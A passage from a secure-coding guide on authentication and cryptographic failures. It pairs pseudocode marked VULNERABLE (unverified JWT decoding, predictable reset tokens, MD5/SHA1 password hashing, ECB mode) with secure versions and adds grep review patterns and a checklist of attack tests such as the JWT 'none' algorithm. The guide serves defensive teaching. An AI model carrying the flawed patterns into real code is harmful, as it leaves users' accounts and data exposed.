        sid: sessionId,              // Bind to session for revocation
        type: "refresh",
        iat: now(),
        exp: now() + (7 * 24 * 60 * 60)  // 7 days
    }

    token = jwt.sign(payload, JWT_CONFIG.secret + "_refresh", {
        algorithm: "HS256"
    })

    // Store refresh token hash in database for revocation
    tokenHash = sha256(token)
    storeRefreshToken(user.id, sessionId, tokenHash, payload.exp)

    return token

// SECURE: Refresh flow with rotation
function refreshAccessToken(refreshToken):
    try:
        decoded = jwt.verify(refreshToken, JWT_CONFIG.secret + "_refresh", {
            algorithms: ["HS256"]
        })

        // Verify refresh token is still valid in database
        tokenHash = sha256(refreshToken)
        storedToken = getRefreshToken(decoded.sub, tokenHash)

        if not storedToken or storedToken.revoked:
            return { error: "Refresh token invalid or revoked" }

        // Rotate refresh token (issue new one, revoke old)
        revokeRefreshToken(tokenHash)

        user = findUserById(decoded.sub)
        newAccessToken = createAccessToken(user)
        newRefreshToken = createRefreshToken(user, decoded.sid)

        return {
            accessToken: newAccessToken,
            refreshToken: newRefreshToken
        }

    catch:
        return { error: "Invalid refresh token" }
```

**Why This Is Secure:**
- Explicit algorithm specification prevents algorithm confusion attacks
- Short-lived access tokens minimize exposure window
- JTI (JWT ID) enables token revocation
- Refresh token rotation limits reuse attacks
- Complete claim validation (iss, aud, exp, sub)
- Separate secrets for access and refresh tokens

---

### GOOD Example 4: HttpOnly Secure Cookie Usage

```pseudocode
// SECURE: Cookie-based session with proper attributes
function setSessionCookie(response, sessionId):
    response.setCookie("session_id", sessionId, {
        httpOnly: true,      // Cannot be accessed via JavaScript
        secure: true,        // Only sent over HTTPS
        sameSite: "Strict",  // Not sent with cross-site requests
        path: "/",           // Available for all paths
        domain: ".myapp.com", // Scoped to main domain and subdomains
        maxAge: 24 * 60 * 60  // 24 hours in seconds
    })

// SECURE: JWT in cookie (not localStorage)
function setAuthCookies(response, accessToken, refreshToken):
    // Access token - short lived, same-site strict
    response.setCookie("access_token", accessToken, {
        httpOnly: true,
        secure: true,
        sameSite: "Strict",
        path: "/",
        maxAge: 15 * 60       // 15 minutes
    })

    // Refresh token - limited path to reduce exposure
    response.setCookie("refresh_token", refreshToken, {
        httpOnly: true,
        secure: true,
        sameSite: "Strict",
        path: "/auth/refresh",  // Only sent to refresh endpoint
        maxAge: 7 * 24 * 60 * 60  // 7 days
    })

// SECURE: Cookie cleanup on logout
function clearAuthCookies(response):
    // Set cookies with immediate expiration
    response.setCookie("access_token", "", {
        httpOnly: true,
        secure: true,
        sameSite: "Strict",
        path: "/",
        maxAge: 0             // Immediate expiration
    })

    response.setCookie("refresh_token", "", {
        httpOnly: true,
        secure: true,
        sameSite: "Strict",
        path: "/auth/refresh",
        maxAge: 0
    })

// SECURE: SameSite considerations for cross-origin needs
function setCookieForOAuth(response, stateToken):
    // OAuth requires cookies to work across redirects
    // Use Lax instead of Strict when necessary
    response.setCookie("oauth_state", stateToken, {
        httpOnly: true,
        secure: true,
        sameSite: "Lax",      // Allows top-level navigation
        path: "/auth/callback",
        maxAge: 10 * 60       // 10 minutes for OAuth flow
    })
```

**Why This Is Secure:**
- HttpOnly prevents XSS from stealing tokens
- Secure flag ensures HTTPS-only transmission
- SameSite prevents CSRF attacks
- Path restriction limits which requests include the cookie
- Short maxAge limits exposure window
- Proper domain scoping prevents subdomain attacks

---

### GOOD Example 5: Token Refresh Patterns

```pseudocode
// SECURE: Complete token refresh implementation
class AuthenticationService:

    ACCESS_TOKEN_DURATION = 15 * 60          // 15 minutes
    REFRESH_TOKEN_DURATION = 7 * 24 * 60 * 60  // 7 days
    REFRESH_TOKEN_REUSE_WINDOW = 60           // 1 minute grace period

    function login(email, password):
        user = validateCredentials(email, password)
        if not user:
            return { error: "Invalid credentials" }

        // Create session for tracking
        session = createSession(user.id)

        // Generate token pair
        accessToken = createAccessToken(user)
        refreshToken = createRefreshToken(user, session.id)

        return {
            accessToken: accessToken,
            refreshToken: refreshToken,
            expiresIn: ACCESS_TOKEN_DURATION
        }

    function refresh(refreshToken):
        // Validate refresh token
        decoded = verifyRefreshToken(refreshToken)
        if not decoded.valid:
            return { error: decoded.error }

        // Check token in database
        tokenRecord = getRefreshTokenRecord(decoded.jti)

        if not tokenRecord:
            // Token doesn't exist - possible theft, invalidate session
            invalidateSessionTokens(decoded.sid)
            return { error: "Invalid refresh token" }

        if tokenRecord.revoked:
            // Reuse of revoked token - likely theft
            // Revoke ALL tokens for this session
            invalidateSessionTokens(decoded.sid)
            logSecurityEvent("Refresh token reuse detected", decoded.sub)
            return { error: "Security violation detected" }

        if tokenRecord.usedAt:
            // Token was already used - check if within grace period
            if now() - tokenRecord.usedAt > REFRESH_TOKEN_REUSE_WINDOW:
                // Outside grace period - potential theft
                invalidateSessionTokens(decoded.sid)
                return { error: "Refresh token already used" }
            // Within grace period - return same tokens (replay protection)
            return tokenRecord.lastIssuedTokens

        // Mark token as used
        tokenRecord.usedAt = now()
        tokenRecord.save()

        // Generate new token pair (rotation)
        user = findUserById(decoded.sub)
        newAccessToken = createAccessToken(user)
        newRefreshToken = createRefreshToken(user, decoded.sid)

        // Store new tokens for replay protection
        tokenRecord.lastIssuedTokens = {
            accessToken: newAccessToken,
            refreshToken: newRefreshToken
        }
        tokenRecord.save()

        // Revoke old refresh token (after grace period, it's invalid)
        scheduleTokenRevocation(decoded.jti, REFRESH_TOKEN_REUSE_WINDOW)

        return {
            accessToken: newAccessToken,
            refreshToken: newRefreshToken,
            expiresIn: ACCESS_TOKEN_DURATION
        }

    function logout(accessToken, refreshToken):
        // Revoke access token (add to blacklist until expiry)
        decoded = decodeToken(accessToken)
        if decoded:
            blacklistToken(decoded.jti, decoded.exp)

        // Revoke refresh token immediately
        refreshDecoded = decodeToken(refreshToken)
        if refreshDecoded:
            revokeRefreshToken(refreshDecoded.jti)

        // Optionally invalidate entire session
        if refreshDecoded and refreshDecoded.sid:
            invalidateSession(refreshDecoded.sid)

        return { success: true }

    function logoutAll(userId):
        // Invalidate all sessions for user (password change, security concern)
        sessions = getSessionsForUser(userId)
        for session in sessions:
            invalidateSessionTokens(session.id)
            deleteSession(session.id)

        return { success: true, sessionsInvalidated: length(sessions) }
```

**Why This Is Secure:**
- Refresh token rotation limits reuse attacks
- Token reuse detection identifies potential theft
- Grace period prevents legitimate concurrent request issues
- Complete logout invalidates tokens server-side
- Session binding allows "logout from all devices"

---

### GOOD Example 6: Proper Logout (Token Invalidation)

```pseudocode
// SECURE: Complete logout implementation
function logout(request):
    // Get current session/tokens
    accessToken = request.cookies.access_token
    refreshToken = request.cookies.refresh_token
    sessionId = request.session.id

    // Revoke access token (add to blacklist)
    if accessToken:
        decoded = decodeToken(accessToken)
        if decoded:
            // Add to Redis/cache blacklist with TTL matching token expiry
            blacklistToken(decoded.jti, decoded.exp - now())

    // Revoke refresh token in database
    if refreshToken:
        refreshDecoded = decodeToken(refreshToken)
        if refreshDecoded:
            markRefreshTokenRevoked(refreshDecoded.jti)

    // Delete server-side session
    if sessionId:
        sessionStore.delete(sessionId)

    // Clear client cookies
    response = new Response()
    clearAuthCookies(response)

    return response.redirect("/login")

// SECURE: Token blacklist with automatic expiry
class TokenBlacklist:
    // Use Redis or similar with TTL support

    function add(tokenId, ttlSeconds):
        redis.setex("blacklist:" + tokenId, ttlSeconds, "revoked")

    function isBlacklisted(tokenId):
        return redis.exists("blacklist:" + tokenId)

// SECURE: Middleware to check token validity
function authMiddleware(request, next):
    accessToken = request.cookies.access_token

    if not accessToken:
        return redirect("/login")

    decoded = verifyAccessToken(accessToken)

    if not decoded.valid:
        return redirect("/login")

    // Check blacklist
    if tokenBlacklist.isBlacklisted(decoded.payload.jti):
        return redirect("/login")

    // Token is valid and not revoked
    request.user = decoded.payload
    return next(request)

// SECURE: Logout from all sessions
function logoutAllSessions(request):
    userId = request.user.sub

    // Get all active sessions for user
    sessions = sessionStore.findByUserId(userId)

    // Revoke all refresh tokens
    refreshTokens = getRefreshTokensForUser(userId)
    for token in refreshTokens:
        markRefreshTokenRevoked(token.jti)

    // Delete all sessions
    for session in sessions:
        sessionStore.delete(session.id)

    // Add all user's recent access tokens to blacklist
    // This requires tracking issued tokens or using short expiry
    invalidateAllAccessTokensForUser(userId)

    return success("Logged out from all devices")
```

**Why This Is Secure:**
- Server-side revocation makes logout effective immediately
- Blacklist prevents continued use of revoked tokens
- Automatic TTL cleanup prevents blacklist bloat
- "Logout from all devices" handles session compromise
- Cookie clearing removes client-side references

---

## Edge Cases Section

### Edge Case 1: Race Conditions in Authentication

```pseudocode
// VULNERABLE: Race condition in login attempts
function login(email, password):
    user = findUserByEmail(email)
    failedAttempts = getFailedAttempts(email)

    if failedAttempts >= MAX_ATTEMPTS:
        return error("Account locked")

    // Race condition: two requests check simultaneously,
    // both see failedAttempts = 4, both proceed
    if not verifyPassword(password, user.hashedPassword):
        incrementFailedAttempts(email)  // Not atomic!
        return error("Invalid credentials")

    resetFailedAttempts(email)
    return success()

// SECURE: Atomic rate limiting
function loginWithAtomicRateLimit(email, password):
    // Atomic increment and check in single operation
    result = redis.eval(`
        local attempts = redis.call('INCR', KEYS[1])
        if attempts == 1 then
            redis.call('EXPIRE', KEYS[1], 900)  -- 15 minute window
        end
        return attempts
    `, ["login_attempts:" + email])

    if result > MAX_ATTEMPTS:
        return error("Too many attempts. Try again later.")

    user = findUserByEmail(email)
    if not user or not verifyPassword(password, user.hashedPassword):
        return error("Invalid credentials")

    // Reset on success
    redis.del("login_attempts:" + email)
    return success()

// VULNERABLE: Race condition in concurrent session check
function login(email, password, request):
    user = authenticate(email, password)

    activeSessions = countActiveSessions(user.id)
    if activeSessions >= MAX_SESSIONS:
        return error("Too many active sessions")

    // Race: two logins pass the check simultaneously
    createSession(user.id)  // Now user has MAX_SESSIONS + 1
    return success()

// SECURE: Use database constraints or atomic operations
function loginWithSessionLimit(email, password, request):
    user = authenticate(email, password)

    // Use transaction with row lock
    transaction.start()
    try:
        activeSessions = countActiveSessionsForUpdate(user.id)  // SELECT FOR UPDATE
        if activeSessions >= MAX_SESSIONS:
            transaction.rollback()
            return error("Too many sessions")

        createSession(user.id)
        transaction.commit()
        return success()
    catch:
        transaction.rollback()
        throw
```

---

### Edge Case 2: Timing Attacks on Password Comparison

```pseudocode
// VULNERABLE: Early return reveals password length information
function verifyPassword_vulnerable(input, stored):
    if length(input) != length(stored):
        return false  // Fast return reveals length mismatch

    for i in range(length(input)):
        if input[i] != stored[i]:
            return false  // Fast return reveals first different character

    return true

// VULNERABLE: String comparison has timing differences
function checkPassword_vulnerable(password, hash):
    computedHash = sha256(password)
    return computedHash == hash  // == operator may short-circuit

// SECURE: Constant-time comparison
function constantTimeEquals(a, b):
    if length(a) != length(b):
        // Still need length check, but make it constant-time
        b = b + repeat("\0", max(0, length(a) - length(b)))
        a = a + repeat("\0", max(0, length(b) - length(a)))

    result = 0
    for i in range(length(a)):
        result = result | (charCode(a[i]) ^ charCode(b[i]))

    return result == 0

// SECURE: Use library-provided constant-time comparison
function verifyPassword_secure(password, hashedPassword):
    // bcrypt.compare is designed to be constant-time
    return bcrypt.compare(password, hashedPassword)

// SECURE: Use crypto library's timingSafeEqual
function verifyHash(input, expected):
    inputHash = sha256(input)
    return crypto.timingSafeEqual(
        Buffer.from(inputHash, 'hex'),
        Buffer.from(expected, 'hex')
    )
```

---

### Edge Case 3: Password Reset Token Issues

```pseudocode
// VULNERABLE: Predictable reset token
function createResetToken_vulnerable(userId):
    token = md5(toString(userId) + toString(now()))
    expiry = now() + (60 * 60)  // 1 hour
    saveResetToken(userId, token, expiry)
    return token

// VULNERABLE: Token doesn't expire on use
function resetPassword_vulnerable(token, newPassword):
    resetRecord = getResetToken(token)
    if resetRecord and resetRecord.expiry > now():
        user = findUserById(resetRecord.userId)
        user.hashedPassword = hashPassword(newPassword)
        user.save()
        // Token not invalidated! Can be reused
        return success()
    return error("Invalid token")

// VULNERABLE: Token not invalidated on password change
function changePassword(userId, oldPassword, newPassword):
    user = findUserById(userId)
    if verifyPassword(oldPassword, user.hashedPassword):
        user.hashedPassword = hashPassword(newPassword)
        user.save()
        // Existing reset tokens still valid!
        return success()
    return error("Wrong password")

// SECURE: Complete password reset implementation
function createResetToken_secure(userId):
    // Generate cryptographically random token
    token = generateSecureRandom(32)  // 256 bits
    tokenHash = sha256(token)  // Store hash, not token
    expiry = now() + (15 * 60)  // 15 minutes

    // Invalidate any existing reset tokens
    deleteResetTokensForUser(userId)

    // Store hashed token
    saveResetToken(userId, tokenHash, expiry)

    // Return plaintext token for email (store hash only)
    return token

function resetPassword_secure(token, newPassword):
    tokenHash = sha256(token)
    resetRecord = getResetTokenByHash(tokenHash)

    if not resetRecord:
        return error("Invalid token")

    if resetRecord.expiry < now():
        deleteResetToken(tokenHash)
        return error("Token expired")

    if resetRecord.used:
        return error("Token already used")

    // Validate new password strength
    validation = validatePasswordStrength(newPassword)
    if not validation.valid:
        return error(validation.errors)

    user = findUserById(resetRecord.userId)

    // Update password
    user.hashedPassword = hashPassword(newPassword)
    user.passwordChangedAt = now()
    user.save()

    // Mark token as used (or delete)
    resetRecord.used = true
    resetRecord.save()

    // Invalidate all existing sessions
    invalidateAllSessionsForUser(user.id)

    // Invalidate all refresh tokens
    revokeAllRefreshTokensForUser(user.id)

    // Send notification email
    sendPasswordChangedNotification(user.email)

    return success()
```

---

### Edge Case 4: OAuth State Parameter Issues

```pseudocode
// VULNERABLE: No state parameter - CSRF possible
function initiateOAuth_vulnerable():
    redirectUrl = OAUTH_PROVIDER_URL +
        "?client_id=" + CLIENT_ID +
        "&redirect_uri=" + CALLBACK_URL +
        "&scope=email profile"
    return redirect(redirectUrl)

// VULNERABLE: Predictable state
function initiateOAuth_weakState():
    state = toString(now())  // Predictable!
    storeState(state)
    redirectUrl = OAUTH_PROVIDER_URL +
        "?client_id=" + CLIENT_ID +
        "&state=" + state +
        "&redirect_uri=" + CALLBACK_URL
    return redirect(redirectUrl)

// VULNERABLE: State not validated on callback
function handleCallback_vulnerable(request):
    code = request.query.code
    // state parameter ignored!
    tokens = exchangeCodeForTokens(code)
    return loginWithTokens(tokens)

// VULNERABLE: State reuse possible
function handleCallback_reuseVulnerable(request):
    code = request.query.code
    state = request.query.state

    if isValidState(state):  // Just checks if it exists
        // Doesn't delete/invalidate state after use
        tokens = exchangeCodeForTokens(code)
        return loginWithTokens(tokens)

    return error("Invalid state")

// SECURE: Complete OAuth implementation
function initiateOAuth_secure(request):
    // Generate random state
    state = generateSecureRandom(32)

    // Bind state to user's session (CSRF protection)
    request.session.oauthState = state
    request.session.oauthStateCreatedAt = now()

    // Optional: include nonce for ID token validation
    nonce = generateSecureRandom(32)
    request.session.oauthNonce = nonce

    redirectUrl = OAUTH_PROVIDER_URL +
        "?client_id=" + CLIENT_ID +
        "&response_type=code" +
        "&redirect_uri=" + encodeURIComponent(CALLBACK_URL) +
        "&scope=" + encodeURIComponent("openid email profile") +
        "&state=" + state +
        "&nonce=" + nonce

    return redirect(redirectUrl)

function handleCallback_secure(request):
    code = request.query.code
    state = request.query.state
    error = request.query.error

    // Check for OAuth error
    if error:
        logOAuthError(error, request.query.error_description)
        return redirect("/login?error=oauth_failed")

    // Validate state
    if not state:
        return error("Missing state parameter")

    storedState = request.session.oauthState
    stateCreatedAt = request.session.oauthStateCreatedAt

    // Constant-time comparison
    if not constantTimeEquals(state, storedState):
        logSecurityEvent("OAuth state mismatch", request)
        return error("Invalid state")

    // Check state expiry (5 minutes)
    if now() - stateCreatedAt > 300:
        return error("OAuth session expired")

    // Clear state immediately (one-time use)
    delete request.session.oauthState
    delete request.session.oauthStateCreatedAt

    // Exchange code for tokens
    tokenResponse = await exchangeCodeForTokens(code, CALLBACK_URL)

    if not tokenResponse.id_token:
        return error("Missing ID token")

    // Validate ID token
    idToken = verifyIdToken(tokenResponse.id_token, {
        audience: CLIENT_ID,
        nonce: request.session.oauthNonce  // Verify nonce
    })

    delete request.session.oauthNonce

    if not idToken.valid:
        return error("Invalid ID token")

    // Create or update user
    user = findOrCreateUserFromOAuth(idToken.payload)

    // Create session with new session ID
    createAuthenticatedSession(request, user)

    return redirect("/dashboard")
```

---

## Common Mistakes Section

### Common Mistake 1: Checking User ID from Token Payload Without Verification

```pseudocode
// VULNERABLE: Trusting unverified token payload
function getUserFromToken_vulnerable(token):
    // Decodes token WITHOUT verification
    decoded = base64Decode(token.split(".")[1])
    payload = JSON.parse(decoded)

    // Trusting the user ID from unverified payload!
    return findUserById(payload.sub)

// VULNERABLE: Verifying signature but using wrong data source
function getUser_vulnerable(request):
    token = request.headers.authorization.replace("Bearer ", "")

    // Verify the token (good)
    isValid = jwt.verify(token, secret)

    if isValid:
        // But then extract user from request body (bad!)
        userId = request.body.userId
        return findUserById(userId)

// SECURE: Always use verified payload
function getUserFromToken_secure(token):
    try:
        // Verify and decode in one operation
        decoded = jwt.verify(token, secret, { algorithms: ["HS256"] })

        // Use the verified payload, not a separate data source
        return findUserById(decoded.sub)
    catch:
        return null

// SECURE: Middleware that sets verified user
function authMiddleware(request, next):
    token = extractTokenFromRequest(request)

    if not token:
        return unauthorized()

    try:
        verified = jwt.verify(token, secret, {
            algorithms: ["HS256"],
            issuer: "myapp"
        })

        // Set user from VERIFIED token only
        request.user = {
            id: verified.sub,
            email: verified.email,
            role: verified.role
        }

        return next()
    catch:
        return unauthorized()
```

---

### Common Mistake 2: Not Invalidating Old Sessions

```pseudocode
// VULNERABLE: Password change doesn't invalidate sessions
function changePassword_vulnerable(request, oldPassword, newPassword):
    user = request.user

    if verifyPassword(oldPassword, user.hashedPassword):
        user.hashedPassword = hashPassword(newPassword)
        user.save()
        return success("Password changed")

    return error("Wrong password")
    // Existing sessions remain valid! Attacker still logged in

// VULNERABLE: Role change doesn't update session
function demoteUser_vulnerable(userId):
    user = findUserById(userId)
    user.role = "basic"
    user.save()
    // User's existing sessions still have old role!
    return success()

// SECURE: Invalidate sessions on security-sensitive changes
function changePassword_secure(request, oldPassword, newPassword):
    user = request.user

    if not verifyPassword(oldPassword, user.hashedPassword):
        return error("Wrong password")

    // Update password
    user.hashedPassword = hashPassword(newPassword)
    user.passwordChangedAt = now()
    user.save()

    // Invalidate ALL sessions except current (or including current)
    currentSessionId = request.session.id
    sessions = getAllSessionsForUser(user.id)

    for session in sessions:
        if session.id != currentSessionId:  // Keep current or invalidate all
            deleteSession(session.id)

    // Revoke all refresh tokens
    revokeAllRefreshTokensForUser(user.id)

    // Optional: Force re-authentication
    regenerateSession(request)

    return success("Password changed. Other sessions logged out.")

// SECURE: Track password change timestamp in tokens
function validateToken_withPasswordCheck(token):
    decoded = jwt.verify(token, secret)

    user = findUserById(decoded.sub)

    // Check if token was issued before password change
    if decoded.iat < user.passwordChangedAt:
        return { valid: false, error: "Password changed since token issued" }

    return { valid: true, payload: decoded }
```

---

### Common Mistake 3: SameSite Cookie Misunderstanding

```pseudocode
// VULNERABLE: Using Lax when Strict is needed
function setSessionCookie_wrongSameSite(response, sessionId):
    response.setCookie("session_id", sessionId, {
        httpOnly: true,
        secure: true,
        sameSite: "Lax"  // Allows cookie on top-level navigation
        // Attacker can CSRF via: <a href="https://bank.com/transfer?to=attacker">
    })

// VULNERABLE: Omitting SameSite (defaults vary by browser)
function setSessionCookie_noSameSite(response, sessionId):
    response.setCookie("session_id", sessionId, {
        httpOnly: true,
        secure: true
        // SameSite not specified - browser-dependent behavior
    })

// VULNERABLE: Using None without understanding implications
function setSessionCookie_sameNone(response, sessionId):
    response.setCookie("session_id", sessionId, {
        httpOnly: true,
        secure: true,
        sameSite: "None"  // Sent on ALL cross-site requests - CSRF vulnerable!
    })

// GUIDE: When to use each SameSite value

// STRICT: Most secure, use for sensitive auth cookies
// - Cookie NOT sent on any cross-site request
// - User clicking link from email to your site won't be logged in
// - Best for: Banking, admin panels, security-critical apps
function setStrictCookie(response, sessionId):
    response.setCookie("session_id", sessionId, {
        httpOnly: true,
        secure: true,
        sameSite: "Strict"
    })

// LAX: Balance of security and usability
// - Cookie sent on top-level navigation (clicking links)
// - NOT sent on cross-site POST, images, iframes
// - Good for: General user sessions where link-sharing matters
// - STILL NEED CSRF tokens for POST/PUT/DELETE endpoints!
function setLaxCookie(response, sessionId):
    response.setCookie("session_id", sessionId, {
        httpOnly: true,
        secure: true,
        sameSite: "Lax"
    })
    // Additional CSRF protection still recommended

// NONE: Only for cross-site embedding needs
// - Cookie sent on ALL requests including cross-site
// - REQUIRES Secure attribute (HTTPS only)
// - Only use for: OAuth flows, embedded widgets, intentional cross-site
function setNoneCookie_onlyWhenNeeded(response, oauthToken):
    response.setCookie("oauth_continuation", oauthToken, {
        httpOnly: true,
        secure: true,          // REQUIRED with SameSite=None
        sameSite: "None",
        maxAge: 300            // Short-lived for specific purpose
    })
```

---

## Security Header Configurations

```pseudocode
// SECURE: Complete security headers for authentication
function setSecurityHeaders(response):
    // Prevent clickjacking (don't allow embedding in frames)
    response.setHeader("X-Frame-Options", "DENY")

    // Modern clickjacking protection
    response.setHeader("Content-Security-Policy",
        "default-src 'self'; " +
        "script-src 'self'; " +
        "style-src 'self' 'unsafe-inline'; " +
        "frame-ancestors 'none'; " +
        "form-action 'self'"
    )

    // Prevent MIME type sniffing
    response.setHeader("X-Content-Type-Options", "nosniff")

    // Enable browser XSS filter (legacy, CSP is better)
    response.setHeader("X-XSS-Protection", "1; mode=block")

    // Only allow HTTPS
    response.setHeader("Strict-Transport-Security",
        "max-age=31536000; includeSubDomains; preload"
    )

    // Control referrer information
    response.setHeader("Referrer-Policy", "strict-origin-when-cross-origin")

    // Disable feature policies for sensitive features
    response.setHeader("Permissions-Policy",
        "geolocation=(), camera=(), microphone=(), payment=()"
    )

    // Cache control for authenticated pages
    response.setHeader("Cache-Control",
        "no-store, no-cache, must-revalidate, private"
    )
    response.setHeader("Pragma", "no-cache")
    response.setHeader("Expires", "0")

// SECURE: Login page specific headers
function setLoginPageHeaders(response):
    setSecurityHeaders(response)

    // Additional login protection
    response.setHeader("Content-Security-Policy",
        "default-src 'self'; " +
        "script-src 'self'; " +
        "style-src 'self'; " +
        "form-action 'self'; " +        // Forms only submit to same origin
        "frame-ancestors 'none'; " +     // Prevent clickjacking
        "base-uri 'self'"               // Prevent base tag injection
    )

// SECURE: API endpoint headers
function setApiHeaders(response):
    // API responses shouldn't be cached
    response.setHeader("Cache-Control", "no-store")

    // Prevent embedding
    response.setHeader("X-Content-Type-Options", "nosniff")

    // CORS configuration (adjust based on needs)
    response.setHeader("Access-Control-Allow-Origin",
        getAllowedOrigin())  // Not "*" for authenticated APIs!
    response.setHeader("Access-Control-Allow-Credentials", "true")
    response.setHeader("Access-Control-Allow-Methods",
        "GET, POST, PUT, DELETE, OPTIONS")
    response.setHeader("Access-Control-Allow-Headers",
        "Content-Type, Authorization")
```

---

## Detection Hints: How to Spot Authentication Issues

### Code Review Patterns

```pseudocode
// RED FLAGS in authentication code:

// 1. Missing algorithm specification in JWT verification
jwt.verify(token, secret)  // BAD - should specify algorithms
jwt.decode(token)          // BAD - decode doesn't verify!

// 2. Session not regenerated after login
request.session.userId = user.id  // Search for: session assignment without regenerate

// 3. Tokens in localStorage
localStorage.setItem("token"  // Search for: localStorage.*token

// 4. No HttpOnly on session cookies
setCookie("session", id)  // Search for: setCookie without httpOnly

// 5. Weak secrets
JWT_SECRET = "secret"     // Search for: SECRET.*=.*["']

// 6. No expiration
jwt.sign(payload, secret)  // Without expiresIn

// 7. Password comparison without constant-time
if password == storedHash  // Direct comparison

// 8. No rate limiting on login
function login(email, password)  // Check for rate limit before auth logic

// GREP patterns for security review:
// localStorage\.setItem.*token
// sessionStorage\.setItem.*token
// jwt\.decode\s*\(
// jwt\.verify\s*\([^,]+,[^,]+\s*\)  (missing options)
// sameSite.*None
// password.*==
// \.secret\s*=\s*["']
```

### Security Testing Checklist

```pseudocode
// Authentication security test cases:

// 1. Token manipulation tests
- [ ] Change JWT algorithm to "none" and remove signature
- [ ] Modify JWT payload (role, user ID) and check if accepted
- [ ] Use expired token
- [ ] Use token with wrong issuer/audience

// 2. Session tests
- [ ] Check if session ID changes after login
- [ ] Attempt session fixation (set session ID before login)
- [ ] Check session timeout enforcement
- [ ] Verify logout actually invalidates session

// 3. Password tests
- [ ] Test common passwords (password123, qwerty, etc.)
- [ ] Test password length limits (very long passwords)
- [ ] Check password reset token predictability
- [ ] Verify password reset invalidates old tokens

// 4. Cookie tests
- [ ] Check HttpOnly flag on session cookies
- [ ] Check Secure flag on session cookies
- [ ] Test SameSite enforcement
- [ ] Verify cookie scope (path, domain)

// 5. Rate limiting tests
- [ ] Attempt rapid login failures
- [ ] Check for account lockout
- [ ] Test rate limit bypass (different IPs, headers)

// 6. OAuth tests
- [ ] Test with missing state parameter
- [ ] Test with reused state parameter
- [ ] Check redirect_uri validation
```

---

## Security Checklist

- [ ] Passwords validated against common password list and breach databases
- [ ] Password hashing uses bcrypt, argon2, or scrypt with appropriate work factor
- [ ] Session IDs generated with cryptographically secure random
- [ ] Session regenerated after authentication and privilege changes
- [ ] JWT algorithm explicitly specified (not derived from token)
- [ ] JWT "none" algorithm explicitly rejected
- [ ] JWT secrets are strong (256+ bits) and stored securely
- [ ] JWT expiration is short for access tokens (15-30 minutes)
- [ ] Refresh token rotation implemented
- [ ] Tokens can be revoked server-side (blacklist or session binding)
- [ ] Authentication cookies have HttpOnly, Secure, and appropriate SameSite
- [ ] Tokens stored in HttpOnly cookies, not localStorage/sessionStorage
- [ ] Rate limiting implemented on login endpoints
- [ ] Account lockout after repeated failures
- [ ] Constant-time comparison used for password/token verification
- [ ] Password reset tokens are cryptographically random and single-use
- [ ] Password change invalidates existing sessions
- [ ] OAuth state parameter is random and validated
- [ ] Security headers configured (HSTS, CSP, X-Frame-Options, etc.)
- [ ] Logout invalidates session/tokens server-side
- [ ] "Logout from all devices" functionality available

---

# Pattern 5: Cryptographic Failures

**CWE References:** CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-328 (Reversible One-Way Hash), CWE-329 (Not Using a Random IV with CBC Mode), CWE-330 (Use of Insufficiently Random Values), CWE-331 (Insufficient Entropy), CWE-338 (Use of Cryptographically Weak PRNG), CWE-916 (Use of Password Hash With Insufficient Computational Effort)

**Priority Score:** 18-20 (Frequency: 7, Severity: 9, Detectability: 4-6)

---

## Introduction: Crypto is Hard—AI Often Copies Deprecated Patterns

Cryptographic implementations represent one of the most perilous areas in security-sensitive code. AI models are particularly prone to generating insecure cryptographic patterns due to several compounding factors:

**Why AI Models Generate Weak Cryptography:**

1. **Training Data Time Lag:** Cryptographic best practices evolve continuously. Training data contains years of outdated tutorials, Stack Overflow answers, and documentation recommending algorithms now considered broken (MD5, SHA1, DES, RC4). AI models cannot distinguish between "worked in 2015" and "secure in 2025."

2. **Tutorial Simplification:** Educational materials often use simplified crypto examples to teach concepts—MD5 for demonstration, short keys for readability, static IVs for reproducibility. AI learns these "teaching patterns" as valid implementations.

3. **Copy-Paste Prevalence:** Cryptographic code is frequently copied rather than understood. Training data reflects this—the same insecure patterns appear thousands of times across repositories, reinforcing incorrect approaches.

4. **API Complexity Hides Danger:** Modern cryptographic libraries have complex APIs where default parameters may be insecure. AI generates code that "works" by using defaults without understanding that those defaults may lack authentication (ECB mode) or use weak key derivation.

5. **Security vs. Convenience Trade-offs:** AI models optimize for code that compiles and runs. Cryptographic security often requires additional steps (proper IV generation, authenticated modes, key derivation) that AI omits for simplicity.

6. **Cross-Language Confusion:** Cryptographic APIs vary dramatically between languages. AI conflates patterns from different ecosystems, generating hybrid code that may compile but violates security assumptions of both libraries.

**Impact Statistics:**

- **29%** of data breaches involve cryptographic failures (Verizon DBIR 2024)
- Cryptographic flaws appear in **Top 2** of OWASP Top 10 2021 ("Cryptographic Failures")
- **62%** of AI-generated code samples use MD5 or SHA1 for password hashing (Security research 2024)
- Cost of a breach due to weak encryption: **$4.8 million** average (IBM Cost of a Data Breach 2024)
- **40%** of applications still use broken cryptographic algorithms in production (Veracode State of Software Security)

---

## BAD Examples: Multiple Manifestations

### BAD Example 1: MD5/SHA1 for Password Hashing

```pseudocode
// VULNERABLE: MD5 for password hashing
function hashPassword(password):
    return md5(password)

// VULNERABLE: SHA1 for password storage
function storePassword(userId, password):
    hashedPassword = sha1(password)
    database.update("users", userId, {"password": hashedPassword})

// VULNERABLE: Single-round SHA256 (still too fast)
function createPasswordHash(password):
    return sha256(password)

// VULNERABLE: Unsalted hash
function verifyPassword(inputPassword, storedHash):
    return sha256(inputPassword) == storedHash

// VULNERABLE: Simple salt without proper KDF
function hashWithSalt(password, salt):
    return sha256(salt + password)

// VULNERABLE: MD5 with salt (still MD5)
function improvedHash(password):
    salt = generateRandomBytes(16)
    hash = md5(salt + password)
    return salt + ":" + hash
```

**Why This Is Dangerous:**
- MD5 produces collisions in seconds on modern hardware
- SHA1 collision attacks are practical (SHAttered attack, 2017)
- Even SHA256 is too fast for password hashing—billions of hashes per second on GPUs
- Unsalted hashes enable rainbow table attacks
- Simple concatenation (salt + password) doesn't provide sufficient protection
- Password cracking rigs can test 180 billion MD5 hashes per second

**Attack Scenario:**
```pseudocode
// Attacker steals database with MD5 password hashes
// Using hashcat on modern GPU:

hashcat_speed = 180_000_000_000  // 180 billion MD5/second
common_passwords = 1_000_000_000  // 1 billion common passwords

time_to_crack_all = common_passwords / hashcat_speed
// Result: ~5.5 seconds to check ALL common passwords against ALL hashes

// Even SHA256 is fast:
sha256_speed = 23_000_000_000  // 23 billion SHA256/second
// Still under a minute for billion password list
```

---

### BAD Example 2: ECB Mode Encryption

```pseudocode
// VULNERABLE: ECB mode reveals patterns
function encryptData(plaintext, key):
    cipher = createCipher("AES", key, mode = "ECB")
    return cipher.encrypt(plaintext)

